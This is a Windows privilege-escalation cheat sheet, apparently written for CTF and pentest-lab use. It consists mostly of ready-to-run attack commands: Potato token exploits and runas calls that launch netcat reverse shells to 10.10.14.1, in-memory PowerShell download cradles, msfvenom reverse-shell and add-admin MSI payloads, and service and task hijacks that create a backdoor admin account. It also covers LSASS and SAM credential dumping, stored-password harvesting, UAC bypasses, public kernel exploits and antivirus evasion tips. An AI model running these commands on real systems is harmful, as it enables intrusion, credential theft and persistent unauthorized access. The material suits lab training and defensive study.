# Windows Privilege Escalation

## Table of Contents
- [Decision Order / Enumeration Checklist](#decision-order--enumeration-checklist)
- [Privilege / Token -> Do This Table](#privilege--token---do-this-table)
- [Enumeration](#enumeration)
- [File Transfer onto Windows](#file-transfer-onto-windows)
- [Token Privileges](#token-privileges)
- [Leaked / Inherited Handle Abuse](#leaked--inherited-handle-abuse)
- [Service Misconfigurations](#service-misconfigurations)
- [Registry Privesc](#registry-privesc)
- [Scheduled Tasks](#scheduled-tasks)
- [UAC Bypass](#uac-bypass)
- [Credential Hunting](#credential-hunting)
- [Kernel / OS Exploits](#kernel--os-exploits)
- [AV / AMSI / CLM Note](#av--amsi--clm-note)

For Active Directory domain escalation see ctf-ad/ (kerberos.md, acl-abuse.md, adcs.md). For Linux privesc see ctf-privesc/linux-privesc.md. For pivoting see ctf-pivoting/pivoting.md.

---

## Decision Order / Enumeration Checklist
Work top-down. Stop at the first thing that lands.
```
1.  whoami /priv        -> SeImpersonate/SeAssignPrimaryToken? => Potato (near-instant SYSTEM)
                        -> SeBackup/SeRestore/SeDebug/SeTakeOwnership/SeLoadDriver/SeManageVolume? => token abuse
2.  whoami /groups      -> member of local Administrators but medium integrity? => UAC bypass
3.  Automated: winPEAS + PowerUp Invoke-AllChecks (triage everything below fast)
4.  Services           -> unquoted paths, weak perms, writable binary, weak registry, DLL hijack
5.  Registry           -> AlwaysInstallElevated, autologon, saved creds (cmdkey)
6.  Scheduled tasks    -> writable script/binary run as SYSTEM/other user
7.  Credential hunt    -> SAM/SYSTEM, LSASS, unattend.xml, GPP, PS history, config files, LAPS
8.  systeminfo -> wesng -> kernel exploit (last resort, may crash box)
```

## Privilege / Token -> Do This Table
| You have | Do this | Section |
|---|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer / GodPotato (2019/10+), JuicyPotato (<=2016/older) | [Token](#token-privileges) |
| `SeAssignPrimaryTokenPrivilege` | Same Potato family (RoguePotato/JuicyPotato use it) | [Token](#token-privileges) |
| `SeBackupPrivilege` | reg save SAM/SYSTEM, copy NTDS.dit -> secretsdump | [Token](#token-privileges) |
| `SeRestorePrivilege` | Overwrite protected file / hijack service binary / Utilman | [Token](#token-privileges) |
| `SeDebugPrivilege` | Dump LSASS (procdump/comsvcs) or migrate into SYSTEM proc | [Token](#token-privileges) |
| `SeTakeOwnershipPrivilege` | takeown a SYSTEM binary/file, rewrite ACL, replace it | [Token](#token-privileges) |
| `SeLoadDriverPrivilege` | Load vulnerable driver (Capcom.sys) -> ring0 | [Token](#token-privileges) |
| `SeManageVolumePrivilege` | SeManageVolumeExploit -> full write to C:\ -> DLL hijack | [Token](#token-privileges) |
| Local admin, medium integrity | UAC bypass (fodhelper/eventvwr) | [UAC](#uac-bypass) |
| Writable service / unquoted path | sc config binPath / drop payload | [Services](#service-misconfigurations) |
| AlwaysInstallElevated=1 | msfvenom .msi, msiexec /qn | [Registry](#registry-privesc) |

---

## Enumeration

### Manual
```cmd
whoami /priv
whoami /all
whoami /groups
systeminfo
hostname
net user
net user %USERNAME%
net localgroup administrators
ipconfig /all
route print
netstat -ano
wmic qfe get Caption,Description,HotFixID,InstalledOn    :: installed patches
driverquery /v                                          :: 3rd-party drivers
schtasks /query /fo LIST /v
tasklist /svc
sc query
set                                                     :: env vars, PATH
```
PowerShell equivalents:
```powershell
Get-LocalUser; Get-LocalGroupMember Administrators
Get-HotFix
Get-CimInstance Win32_Product | select Name,Version
Get-ChildItem Env:
Get-Process -IncludeUserName
```

### Automated
```cmd
:: winPEAS
winPEASx64.exe                          :: full; quiet/creds only: winPEASx64.exe quiet cmd searchall
winPEASany.exe log                      :: .NET any-cpu, write output to file

:: Seatbelt (C#)
Seatbelt.exe -group=all
Seatbelt.exe -group=user
```
```powershell
# PowerUp (PowerSploit)
. .\PowerUp.ps1
Invoke-AllChecks
Invoke-PrivescAudit        # PowerSploit-integrated name

# PrivescCheck (modern, actively maintained)
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report report -Format HTML,TXT

# Sherlock (legacy kernel-exploit finder, superseded by wesng)
. .\Sherlock.ps1; Find-AllVulns

# JAWS
powershell -ep bypass .\jaws-enum.ps1 -OutputFilename jaws.txt
```

## File Transfer onto Windows
```powershell
# PowerShell download (IWR is alias iwr; wget/curl are aliases in Win PS 5)
Invoke-WebRequest http://10.10.14.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
iwr -uri http://10.10.14.1/x.exe -o x.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/x.exe','C:\Windows\Temp\x.exe')
# In-memory (no disk):
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/PowerUp.ps1')
```
```cmd
:: certutil (present on all Windows)
certutil -urlcache -split -f http://10.10.14.1/nc.exe C:\Windows\Temp\nc.exe
certutil -urlcache -f http://10.10.14.1/x.exe x.exe

:: bitsadmin
bitsadmin /transfer job http://10.10.14.1/x.exe C:\Windows\Temp\x.exe
```
```bash
# SMB from Kali (impacket) — pull/push, exec straight from share
impacket-smbserver share ./ -smb2support
impacket-smbserver share ./ -smb2support -user u -password p   # if Win requires auth
```
```cmd
:: On Windows: copy from the share
copy \\10.10.14.1\share\nc.exe .
\\10.10.14.1\share\PrintSpoofer.exe -i -c cmd     :: run directly off share
```
Base64 (small files, no network):
```bash
# Kali: encode
base64 -w0 shell.bin > b64.txt
```
```powershell
# Windows: decode
[IO.File]::WriteAllBytes("C:\Windows\Temp\shell.bin",[Convert]::FromBase64String((gc b64.txt)))
```

---

## Token Privileges
`whoami /priv` is the single highest-value check. A privilege shown as **Disabled** is still usable — the process can enable it. What matters is that it is listed.

### SeImpersonatePrivilege -> Potato family
Held by service accounts (IIS `iis apppool\...`, `NT SERVICE\MSSQLSERVER`, `mssql-svc`). Abuses NTLM/RPC coercion to relay a SYSTEM token into a new process. **Pick by Windows version:**

| Tool | Works on | Notes |
|---|---|---|
| **PrintSpoofer** | 2016 / 2019 / 2022, Win10/11 | Uses named-pipe (spoolss). Simplest first try on modern hosts. |
| **GodPotato** | 2012–2022, Win8–11 (.NET) | DCOM/RPC; broadest modern coverage. Try if PrintSpoofer fails. |
| **JuicyPotato** | Win7/8, 2008/2012/2016, Win10 <1809 | Needs a working DCOM CLSID; **dead** on 2019/Win10-1809+ (BITS CLSID fixed). |
| **RoguePotato** | 2019 / Win10 1809+ | Revives JuicyPotato via OXID resolver redirect to attacker:135. |
| **JuicyPotatoNG** | 2022 / Win11 | Modern DCOM revival when the two above are patched. |

```cmd
:: PrintSpoofer — run a command or pop interactive SYSTEM shell
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 10.10.14.1 443 -e cmd.exe"

:: GodPotato (specify installed .NET; -cmd is the payload)
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe -e cmd 10.10.14.1 443"

:: JuicyPotato (older hosts). -t * tries both CreateProcess APIs.
:: -c = DCOM CLSID (must match OS; see ohpe/juicy-potato CLSID lists), -l = COM listen port
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "10.10.14.1 443 -e cmd.exe" -t * -c {CLSID}

:: RoguePotato (2019/Win10-1809+). Needs socat relay of 135 from attacker box.
:: Kali:  socat tcp-listen:135,reuseaddr,fork tcp:VICTIM:9999
RoguePotato.exe -r 10.10.14.1 -e "C:\Windows\Temp\nc.exe 10.10.14.1 443 -e cmd.exe" -l 9999

:: JuicyPotatoNG (2022/Win11)
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```

### SeAssignPrimaryTokenPrivilege
Assign a token to a new process. Same Potato tooling exploits it (JuicyPotato/RoguePotato require it or SeImpersonate). If you have this but not SeImpersonate, potatoes still generally work.

### SeBackupPrivilege / SeRestorePrivilege
`SeBackup` = read any file (bypass ACLs). `SeRestore` = write any file. Dump the hives, crack/pass offline.
```cmd
:: SeBackup — grab SAM + SYSTEM (then secretsdump offline)
reg save HKLM\SAM  C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```
```powershell
# SeBackup via the backup API when reg/copy is blocked — diskshadow + robocopy /b
# 1) diskshadow script to snapshot C:
"set context persistent nowriters
add volume c: alias sh
create
expose %sh% z:" | Out-File -Encoding ascii diskshadow.txt
diskshadow /s diskshadow.txt
robocopy /b z:\Windows\ntds . ntds.dit          # /b = backup mode uses SeBackup
robocopy /b z:\Windows\System32\config . SYSTEM
```
```bash
# Kali offline extraction
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL   # DC: dumps all domain hashes
```
SeRestore: overwrite a SYSTEM-run binary or a hijackable service DLL, then trigger it. Classic: replace `C:\Windows\System32\Utilman.exe` and hit Win+U at logon, or `sethc.exe` (sticky keys).

### SeDebugPrivilege
Debug/read any process. Dump LSASS for creds, or spawn SYSTEM.
```cmd
:: procdump (Sysinternals, often AV-allowlisted)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

:: Built-in comsvcs.dll MiniDump (no upload needed). Get PID from tasklist.
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```
```bash
# Kali: parse the dump
pypykatz lsa minidump lsass.dmp
```
```powershell
# SeDebug -> SYSTEM shell without dumping: PowerShell Get-System style token-steal
# (or use Mimikatz: privilege::debug ; token::elevate ; sekurlsa::logonpasswords)
```

### SeTakeOwnershipPrivilege
Take ownership of any object, then grant yourself write, then replace it.
```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls  C:\Windows\System32\Utilman.exe /grant %USERNAME%:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
:: Lock screen (Win+L) -> Ease-of-Access (Utilman) -> SYSTEM cmd
```

### SeLoadDriverPrivilege
Load a signed-but-vulnerable driver (BYOVD), e.g. Capcom.sys, then exploit ring0. Requires registering a driver service key under HKCU and calling `NtLoadDriver`.
```
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
# then run ExploitCapcom.exe to spawn SYSTEM cmd
```

### SeManageVolumePrivilege
Grants full write to `C:\` root. Chain `SeManageVolumeExploit.exe` (CVE-2021-based technique) to obtain write over `C:\Windows` and DLL-hijack a SYSTEM service (e.g. drop `tzres.dll`/`wbemcomn.dll` where a SYSTEM process loads it).
```cmd
SeManageVolumeExploit.exe
:: then place a malicious DLL and trigger the loading service
```

---

## Leaked / Inherited Handle Abuse
CRTE local-privesc topic. A privileged process (usually SYSTEM) opens a **process / thread / token** handle with too-broad access, or spawns a child with `bInheritHandle=TRUE` (inheritable `SECURITY_ATTRIBUTES` + `bInheritHandles=TRUE` on `CreateProcess`), leaking a usable privileged handle down into a lower-priv context. If your process can obtain or duplicate that handle (`DuplicateHandle` / `NtDuplicateObject`, or because it was inherited), you escalate with no memory-corruption exploit — you simply reuse the privileged object.

Escalation paths once you hold the leaked handle:
- Leaked **process** handle with `PROCESS_CREATE_THREAD` (or `PROCESS_ALL_ACCESS`) -> `CreateRemoteThread` shellcode into the SYSTEM process.
- Leaked **process/thread** handle with `PROCESS_DUP_HANDLE` -> duplicate that process's **primary token** -> `CreateProcessWithTokenW` / `CreateProcessAsUser` (needs SeImpersonate/SeAssignPrimaryToken) -> SYSTEM.
- Leaked **token** handle directly -> `ImpersonateLoggedOnUser` / assign to a new process.
- **Inherited** handle: a low-priv child inherits a SYSTEM parent's privileged handle — enumerate your own process handle table and reuse it, no duplication needed.

Find leaked / inheritable handles:
```cmd
:: Sysinternals handle.exe - list handles, grep for Process/Token/Thread objects owned by a higher-priv process
handle.exe -accepteula -a -p <PID>
handle.exe -accepteula -a | findstr /i "Process Token Thread"
```
- **Process Hacker / System Informer**: process Properties -> Handles tab; look for Process/Token/Thread handles with broad `GrantedAccess` held by (or inheritable into) your context.
- Programmatic: `NtQuerySystemInformation(SystemHandleInformation / SystemExtendedHandleInformation)` enumerates every handle system-wide with owning PID, object type, and granted-access mask — filter for handles to SYSTEM processes/tokens reachable from your token, then `DuplicateHandle` them.

Reference-level; public tooling demonstrates the primitive (no bespoke loader needed): Metasploit handle-duplication / `getsystem` token-steal modules, and the classic leaked-handle PoCs (`DuplicateHandle` -> token impersonation -> SYSTEM). Same underlying primitive as the `SeDebug`/named-pipe escalations in [Token Privileges](#token-privileges). Confirm a broad handle to a SYSTEM object is actually visible from your token before firing — if none exists, this path does not apply.

---

## Service Misconfigurations
`PowerUp` `Invoke-AllChecks` / winPEAS surface all of these; verify manually before firing.

### Unquoted Service Paths
Path with spaces and no quotes -> Windows tries each space-delimited prefix + `.exe`. Drop a payload at an earlier writable segment.
```cmd
:: Find unquoted paths (excludes properly quoted / Windows dir)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc qc "Service Name"
:: e.g. C:\Program Files\Some Dir\service.exe  -> tries C:\Program.exe then C:\Program Files\Some.exe
:: Drop payload named to match, then:
sc stop svc & sc start svc
```

### Weak Service Permissions (reconfigure binPath)
If your user can change a service config, point it at your payload.
```cmd
:: accesschk — who can modify the service? (SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS)
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "%USERNAME%" *
accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
:: Reconfigure and restart (obPath adds a local admin; or point to nc/msf payload)
sc config daclsvc binPath= "net user hacker Passw0rd! /add & net localgroup administrators hacker /add"
sc stop daclsvc & sc start daclsvc
```
Note the **space after `binPath= `** is required. PowerUp equivalent:
```powershell
Invoke-ServiceAbuse -Name 'daclsvc' -UserName 'domain\user'
```

### Writable Service Binary
The service EXE itself is writable by you -> overwrite it with your payload.
```cmd
accesschk.exe /accepteula -quvw "C:\Program Files\svc\svc.exe"
copy /y payload.exe "C:\Program Files\svc\svc.exe"
sc stop svc & sc start svc
```

### Weak Registry Permissions on Services
You can write the service's registry key -> change `ImagePath`.
```cmd
:: accesschk registry key perms
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\Services
reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\payload.exe" /f
sc start regsvc
```

### DLL Hijacking / PATH Interception
Service (or app run as SYSTEM) loads a DLL that is missing or resolvable from a writable dir earlier in the search order.
```powershell
# Find missing-DLL loads: run Procmon, filter Result = NAME NOT FOUND, Path ends .dll
# Find writable dirs on the system PATH (PATH interception):
$env:Path -split ';' | % { icacls $_ } 2>$null
# Drop a malicious DLL (DllMain payload) named after the missing one into a writable PATH dir.
```
```cmd
:: PowerUp DLL-hijack / PATH check
powershell -c ". .\PowerUp.ps1; Find-PathDLLHijack"
```

---

## Registry Privesc

### AlwaysInstallElevated
If **both** HKLM and HKCU keys = 1, any user can install a .msi as SYSTEM.
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: both must return 0x1
```
```bash
# Kali: build the MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f msi -o evil.msi
msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi -o add.msi
```
```cmd
:: Windows: install silently
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```
PowerUp: `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`.

### Autologon Credentials (Winlogon)
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
```

### Saved Credentials (cmdkey / runas)
```cmd
cmdkey /list                     :: stored creds; if present, reuse without knowing password
runas /savecred /user:ADMIN "C:\Windows\Temp\nc.exe 10.10.14.1 443 -e cmd.exe"
runas /savecred /user:administrator cmd.exe
```

### PuTTY / WinSCP / VNC Stored Creds
```cmd
:: PuTTY sessions (ProxyPassword etc.)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
:: WinSCP stored sessions (encrypted, decryptable)
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
:: VNC (RealVNC/TightVNC) — password in registry, decryptable with vncpwd
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password
reg query "HKCU\Software\TightVNC\Server" /v Password
```
Decrypt: WinSCP `Get-WinSCPPassword` / winscppasswd; VNC `vncpwd.exe`; PuTTY proxy passwords are stored obfuscated but reversible.

---

## Scheduled Tasks
Look for tasks that run as SYSTEM/another user on a script or binary you can modify.
```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```
```powershell
Get-ScheduledTask | ? {$_.Principal.UserId -match 'SYSTEM|Administrator'} | select TaskName,TaskPath
Get-ScheduledTask -TaskName 'Vuln' | select -Expand Actions   # see Execute path
# Check ACL on the target script/binary:
icacls "C:\Scripts\backup.ps1"
```
If the task's script/binary is writable, overwrite it and wait for (or trigger) the next run:
```cmd
echo net localgroup administrators hacker /add >> C:\Scripts\backup.bat
schtasks /run /tn "Vuln Task"          :: if allowed to run it manually
```

---

## UAC Bypass
Needed when you are in the local Administrators group but running at **medium integrity** (split-token). Goal: get a **high-integrity** process. These abuse auto-elevating Microsoft binaries (manifest `autoElevate=true`) that read attacker-controlled registry keys — no consent prompt. Not a privilege escalation to SYSTEM by itself; it un-restricts your admin token. Only useful if `whoami /groups` shows Administrators + `Mandatory Label\Medium`.

```cmd
:: fodhelper (Win10/11) — hijack ms-settings shell open command
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
fodhelper.exe
reg delete "HKCU\Software\Classes\ms-settings" /f

:: computerdefaults (same ms-settings hijack, alt trigger)
computerdefaults.exe

:: eventvwr (Win7-10) — hijack mscfile open command
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Windows\Temp\payload.exe" /f
eventvwr.exe
reg delete "HKCU\Software\Classes\mscfile" /f

:: sdclt (Win10) — hijack via App Paths / exefile
reg add "HKCU\Software\Classes\exefile\shell\runas\command\isolatedCommand" /d "C:\Windows\Temp\payload.exe" /f
sdclt.exe
```
Automation: `UACME` (akagi, dozens of methods), Metasploit `exploit/windows/local/bypassuac_*`, PowerShell `Invoke-EventVwrBypass`.

---

## Credential Hunting

### SAM / SYSTEM Hives
```cmd
:: If readable (backups, SeBackup, or C:\Windows\Repair / regback):
reg save HKLM\SAM  C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
dir C:\Windows\System32\config\RegBack     :: old copies
dir C:\Windows\Repair
```
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### LSASS Dump
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```
Mimikatz (factual): `privilege::debug` then `sekurlsa::logonpasswords` (live) or `sekurlsa::minidump lsass.dmp` + `sekurlsa::logonpasswords` (offline). pypykatz parses dumps on Linux.

### DPAPI
Master keys + blobs decrypt browser/RDP/Wi-Fi/credential-manager secrets. See ctf-ad/credential-access.md for full DPAPI, `mimikatz dpapi::`, and SharpDPAPI workflow.

### unattend.xml / sysprep / Autounattend
Base64 admin passwords from unattended installs.
```cmd
dir /s /b C:\unattend.xml C:\Windows\Panther\unattend.xml C:\Windows\Panther\Unattend\unattended.xml C:\Windows\System32\sysprep\sysprep.xml C:\Windows\System32\sysprep\unattend.xml C:\Autounattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml | findstr /i "password"
```

### Groups.xml — GPP cpassword
SYSVOL Group Policy Preferences store an AES-encrypted password with a **public, static Microsoft key** -> always decryptable. Cross-ref ctf-ad/credential-access.md.
```cmd
findstr /S /I cpassword \\<DC>\sysvol\<domain>\policies\*.xml
:: also Groups.xml, Services\Services.xml, ScheduledTasks\ScheduledTasks.xml, Printers, Drives, DataSources
```
```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

### PowerShell History & Transcripts
```powershell
gc (Get-PSReadlineOption).HistorySavePath
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Config Files & Recursive Password Search
```cmd
:: filename patterns
dir /s /b *.config *.ini web.config *.xml *.txt *.kdbx *.ps1 2>nul | findstr /i "pass cred config vnc unattend"
:: content grep across the disk
findstr /si password *.txt *.ini *.config *.xml *.ps1 *.bat *.cmd 2>nul
findstr /si "password passwd pwd" C:\*.xml C:\*.ini C:\*.txt 2>nul
:: IIS
type C:\inetpub\wwwroot\web.config | findstr /i "password connectionString"
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```powershell
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -EA SilentlyContinue |
  Select-String -Pattern 'password|pwd|connectionString' -EA SilentlyContinue
```

### LAPS
Local admin password stored in AD attribute `ms-Mcs-AdmPwd` (readable by delegated principals). Enumerate/read from a domain context — see ctf-ad/credential-access.md.
```
# quick check for LAPS presence
Get-ChildItem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
```

### Wi-Fi Passwords
```cmd
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear | findstr /i "Key Content"
:: dump all in one go
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profile %j key=clear
```

### Credential Manager
```cmd
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
```

---

## Kernel / OS Exploits
Last resort — may BSOD the target. Feed `systeminfo` to a suggester, match a missing patch, use a precompiled/vetted PoC.
```bash
# WES-NG (Windows Exploit Suggester - Next Generation) — the current tool
wes.py --update
# On Windows: systeminfo > sysinfo.txt   (copy to Kali)
wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
wes.py sysinfo.txt --severity critical
```
Common, reliable EoP exploits (verify OS/patch first):
```
MS16-032  — Secondary Logon handle (svc). Win7-10/2008-2012, multi-CPU boxes. (Invoke-MS16032.ps1)
MS15-051  — win32k ClientCopyImage EoP. Win7/2008R2/2012. (ms15-051x64.exe)
MS16-135  — win32k EoP (Win10 1607/older).
MS10-059  — "Chimichurri" (2008).
CVE-2021-1732 — win32k EoP, Win10 1809-20H2.
PrintNightmare — CVE-2021-34527 (RCE/LPE via Print Spooler AddPrinterDriver). Also CVE-2021-1675.
HiveNightmare / SeriousSAM — CVE-2021-36934. SAM/SYSTEM/SECURITY hives world-readable via VSS.
SMBGhost — CVE-2020-0796. SMBv3.1.1 compression LPE (and RCE), Win10 1903/1909.
```
```cmd
:: HiveNightmare (CVE-2021-36934) — read hives from a shadow copy as low-priv user
icacls C:\Windows\System32\config\SAM        :: BUILTIN\Users:(I)(RX) => vulnerable
:: use HiveNightmare.exe / Invoke-HiveNightmare to copy SAM,SYSTEM,SECURITY from \\?\GLOBALROOT\...HarddiskVolumeShadowCopyN
```
```bash
# PrintNightmare CVE-2021-34527 LPE PoC
python3 CVE-2021-1675.py 'DOMAIN/user:pass@target' '\\attacker\share\evil.dll'
# or PowerShell: Invoke-Nightmare -DriverName "x" -NewUser hacker -NewPassword Passw0rd!
```

---

## AV / AMSI / CLM Note
Windows Defender, AMSI (script scanning), and PowerShell Constrained Language Mode (CLM) will block many of the tools above. For AMSI bypasses, Defender evasion, CLM breakout, and obfuscation, see ctf-ad/opsec-and-detection.md. Quick sanity checks:
```powershell
$ExecutionContext.SessionState.LanguageMode      # FullLanguage vs ConstrainedLanguage
Get-MpComputerStatus | select RealTimeProtectionEnabled,AMSIEnabled
```
Practical fallbacks when tooling is caught: use precompiled native EXEs off an SMB share instead of PS scripts, rename/recompile signatured binaries, or run `.NET`/C# assemblies in-memory. Prefer LOLBins (certutil, comsvcs, reg, sc, schtasks, wmic) which are rarely flagged.
